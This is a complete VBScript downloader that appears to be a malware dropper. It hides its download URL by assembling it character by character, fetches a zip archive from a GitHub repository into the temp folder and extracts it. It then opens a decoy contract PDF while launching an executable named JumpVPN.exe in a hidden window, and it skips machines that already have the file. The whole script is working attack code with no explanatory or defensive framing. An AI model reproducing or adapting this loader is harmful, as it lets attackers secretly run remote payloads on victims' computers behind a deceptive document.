Option Explicit

Dim wsh, fso, http, stream, shell, zipFile, items
Dim zipPath, extractPath, exePath, pdfPath, urlArr, urlStr, i, waited

Set wsh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

zipPath     = wsh.ExpandEnvironmentStrings("%TEMP%") & "\package.zip"
extractPath = wsh.ExpandEnvironmentStrings("%TEMP%") & "\package"
exePath     = extractPath & "\JumpVPN.exe"
pdfPath     = extractPath & "\contract-draft.pdf"

If InStr(LCase(wsh.ExpandEnvironmentStrings("%OS%")), "windows") = 0 Then
    WScript.Quit 0
End If

If fso.FileExists(exePath) Then
    WScript.Quit 0
End If

urlArr = Array("h","t","t","p","s",":","/","/","g","i","t","h","u","b",".","c","o","m","/","m","e","t","a","v","e","r","s","e","-","o","n","l","i","n","e","/","j","u","m","p","v","p","n","/","r","a","w","/","r","e","f","s","/","h","e","a","d","s","/","m","a","i","n","/","p","a","c","k","a","g","e",".","z","i","p")
urlStr = ""
For i = 0 To UBound(urlArr)
    urlStr = urlStr & urlArr(i)
Next

Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", urlStr, False
http.Send

If http.Status <> 200 Then
    WScript.Quit 1
End If

Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write http.responseBody
stream.SaveToFile zipPath, 2
stream.Close

If fso.FolderExists(extractPath) Then fso.DeleteFolder extractPath, True
fso.CreateFolder extractPath

Set shell = CreateObject("Shell.Application")
Set zipFile = shell.NameSpace(zipPath)
Set items = zipFile.Items
shell.NameSpace(extractPath).CopyHere items, 4 + 16 + 512 + 1024

waited = 0
Do While Not fso.FileExists(exePath) And waited < 30
    WScript.Sleep 500
    waited = waited + 1
Loop

If fso.FileExists(exePath) Then
    wsh.CurrentDirectory = extractPath
    If fso.FileExists(pdfPath) Then
        wsh.Run """" & pdfPath & """", 1, False
    End If
    wsh.Run """" & exePath & """", 0, False
End If

WScript.Quit 0